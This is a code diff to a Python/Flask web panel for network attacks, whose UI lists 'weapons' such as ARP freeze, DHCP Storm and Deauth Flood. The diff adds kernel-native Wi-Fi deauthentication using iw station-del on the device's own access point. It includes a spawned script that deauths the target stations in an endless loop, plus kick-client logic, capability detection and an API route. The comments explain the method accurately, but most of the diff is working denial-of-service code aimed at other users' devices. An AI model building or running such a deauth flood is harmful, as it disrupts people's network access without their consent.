@@ -622,6 +622,50 @@ def check_monitor_support(iface):
     except:
         return False
 
+# ---------- native (no-monitor-mode) deauth via AP station-del ----------
+# When this device's own Wi-Fi interface is running as an access point (e.g. a
+# rooted-Android hotspot), the kernel can be told to deauth one of ITS OWN
+# connected stations via `iw dev <if> station del <mac> subtype 0xC` -- a real
+# nl80211 primitive, no monitor mode, no packet injection, interface stays
+# fully operational. This does NOT let a client interface forge deauth frames
+# at other devices on a network it merely joined; there is no netlink shortcut
+# for that -- it genuinely requires monitor mode + an injection-capable driver,
+# which is why that path (below) is left untouched.
+def get_iface_type(iface):
+    """Return the current nl80211 interface type (managed, AP, monitor, ...) or None if unknown."""
+    try:
+        out = subprocess.check_output(['iw', 'dev', iface, 'info'], stderr=subprocess.DEVNULL, text=True, timeout=5)
+        m = re.search(r'^\s*type (\S+)', out, re.MULTILINE)
+        return m.group(1) if m else None
+    except:
+        return None
+
+def list_ap_stations(iface):
+    """MAC addresses of stations currently associated to this AP-mode interface."""
+    try:
+        out = subprocess.check_output(['iw', 'dev', iface, 'station', 'dump'], stderr=subprocess.DEVNULL, text=True, timeout=5)
+    except:
+        return []
+    return [m.lower() for m in re.findall(r'^Station ([0-9a-fA-F:]{17})', out, re.MULTILINE)]
+
+def native_deauth_station(iface, mac, reason_code=2):
+    """Send a real kernel-native deauth to an associated station. Only valid when iface is our own AP."""
+    try:
+        res = subprocess.run(['iw', 'dev', iface, 'station', 'del', mac, 'subtype', '0xC', 'reason-code', str(reason_code)],
+                              stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
+        return res.returncode == 0
+    except:
+        return False
+
+def deauth_capability(iface):
+    """What mechanism kick_client/start_attack_deauth will actually use for this interface, honestly."""
+    iface_type = get_iface_type(iface)
+    if iface_type == 'AP':
+        return {'method': 'native', 'iface_type': iface_type, 'ap_station_count': len(list_ap_stations(iface))}
+    if check_monitor_support(iface):
+        return {'method': 'monitor', 'iface_type': iface_type}
+    return {'method': 'unavailable', 'iface_type': iface_type}
+
 # ---------- checksum helpers ----------
 def ip_checksum(data):
     if len(data) % 2 == 1:
@@ -710,8 +754,43 @@ def start_attack_arp_freeze(targets, gateway, iface):
         pids.append(proc)
         return pids
 
+def start_attack_deauth_native(targets, iface):
+    """Continuously re-deauth targets that are associated stations on our own AP -- no monitor mode."""
+    stations = set(list_ap_stations(iface))
+    target_macs = []
+    for t_ip in targets:
+        for h in STATE['hosts']:
+            if h['ip'] == t_ip and h['mac'].lower() in stations:
+                target_macs.append(h['mac'])
+                break
+    if not target_macs:
+        raise RuntimeError(f'{iface} is running as an access point, but none of the selected targets are currently associated stations on it.')
+    add_log('info', f'{iface} is in AP mode -- using native kernel deauth flood (station-del), no monitor mode, for {len(target_macs)} station(s)')
+    script = textwrap.dedent(f"""
+        import subprocess, time
+        IFACE = '{iface}'
+        MACS = {target_macs}
+        while True:
+            for mac in MACS:
+                subprocess.run(['iw', 'dev', IFACE, 'station', 'del', mac, 'subtype', '0xC', 'reason-code', '2'],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            time.sleep(1)
+    """)
+    fd, path = tempfile.mkstemp(suffix='.py')
+    os.close(fd)
+    with open(path, 'w') as f:
+        f.write(script)
+    proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
+    time.sleep(0.5)
+    if proc.poll() is not None:
+        raise RuntimeError('Native deauth flood script exited immediately')
+    threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
+    return [proc]
+
 def start_attack_deauth(targets, iface):
     add_log('info', f'Starting Deauth Flood on {iface} for {len(targets)} targets')
+    if get_iface_type(iface) == 'AP':
+        return start_attack_deauth_native(targets, iface)
     # First check if monitor mode is supported
     if not check_monitor_support(iface):
         raise RuntimeError('Monitor mode is not supported on this interface. Deauth attack requires monitor mode and a compatible wireless adapter.')
@@ -1001,6 +1080,26 @@ def kill_attack(pids):
 # ---------- kick & block with verification ----------
 def kick_client(ip, mac, iface):
     add_log('info', f'Attempting to kick {ip} ({mac})')
+    iface_type = get_iface_type(iface)
+    if iface_type == 'AP':
+        # This interface is our own access point -- kick the station natively via
+        # the kernel, no monitor mode. Never fall back to monitor mode here: flipping
+        # an AP interface into monitor mode would drop every connected client, not
+        # just this one.
+        if mac.lower() not in list_ap_stations(iface):
+            raise RuntimeError(f'{iface} is running as an access point, but {mac} is not currently an associated station on it.')
+        add_log('info', f'{iface} is in AP mode -- using native kernel deauth (station-del), no monitor mode')
+        if not native_deauth_station(iface, mac):
+            raise RuntimeError(f'Native deauth (station-del) failed for {mac} on {iface}')
+        add_log('success', f'Sent native deauth to {mac}')
+        time.sleep(2)
+        reachable = server_ping(ip, timeout=1)
+        if reachable:
+            add_log('warn', f'Target {ip} is still responding to ping after kick')
+            return False
+        add_log('success', f'Target {ip} is not responding to ping after kick')
+        return True
+
     if not check_monitor_support(iface):
         raise RuntimeError('Monitor mode is not supported on this interface.')
     if not set_monitor(iface, True, raise_on_fail=True):
@@ -1778,6 +1877,7 @@ nav button .icon svg { display: block; }
         <div class="weapon-btn" data-w="4"><span class="num">4</span><span class="label">DHCP Storm</span></div>
         <div class="weapon-btn" data-w="5"><span class="num">5</span><span class="label">Traffic Capture</span></div>
       </div>
+      <div id="deauth-capability" class="status-message">Deauth method: checking...</div>
       <div style="display:flex; gap:10px; flex-wrap:wrap;">
         <button class="btn big" id="start-btn" onclick="confirmStartAttack()">▶ Start</button>
         <button class="btn big secondary" id="stop-btn" onclick="confirmStopAttack()" disabled>⏹ Stop</button>
@@ -1967,6 +2067,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
     btn.classList.add('active');
     document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
+    if (btn.dataset.tab === 'attacks') refreshDeauthCapability();
   });
 });
 
@@ -2193,6 +2294,30 @@ async function setInterface() {
   const res = await apiCall('set_interface', 'POST', { interface: iface });
   showToast(res.status, res.success ? 'success' : 'error');
   checkPrerequisites();
+  refreshDeauthCapability();
+}
+
+// Honest deauth capability: native (own AP, no monitor mode) vs monitor mode vs unavailable.
+// Deliberately not on a recurring timer -- checking monitor support can itself
+// briefly flip interface mode, so this only runs on the Attacks tab and after
+// the interface changes, not in the background.
+async function refreshDeauthCapability() {
+  const box = document.getElementById('deauth-capability');
+  if (!box) return;
+  try {
+    const res = await apiCall('deauth_capability');
+    if (!res.success) {
+      box.textContent = 'Deauth method: ' + (res.error || 'unknown');
+      return;
+    }
+    if (res.method === 'native') {
+      box.innerHTML = `<span class="badge success">Native</span> ${res.iface_type} interface is your own access point — Kick / Deauth Flood use the kernel's station-del, no monitor mode. ${res.ap_station_count} station(s) currently associated.`;
+    } else if (res.method === 'monitor') {
+      box.innerHTML = `<span class="badge warning">Monitor mode</span> Interface is ${res.iface_type} — Kick / Deauth Flood will switch it to monitor mode and use frame injection.`;
+    } else {
+      box.innerHTML = `<span class="badge danger">Unavailable</span> Interface is ${res.iface_type} and doesn't support monitor mode — Kick / Deauth Flood can't function on this hardware.`;
+    }
+  } catch(e) {}
 }
 async function setGateway() {
   const gw = document.getElementById('gateway-input').value.trim();
@@ -2903,6 +3028,14 @@ def api_check_reachability():
     reachable = server_ping(ip)
     latency = int((time.time() - start) * 1000) if reachable else None
     return jsonify({'reachable': reachable, 'latency': latency})
+
+@app.route('/api/deauth_capability', methods=['GET'])
+@require_auth
+def api_deauth_capability():
+    iface = get_state('interface')
+    if not iface:
+        return jsonify({'success': False, 'error': 'Interface not set'})
+    return jsonify({'success': True, **deauth_capability(iface)})
 
 @app.route('/api/kick', methods=['POST'])
 @require_auth
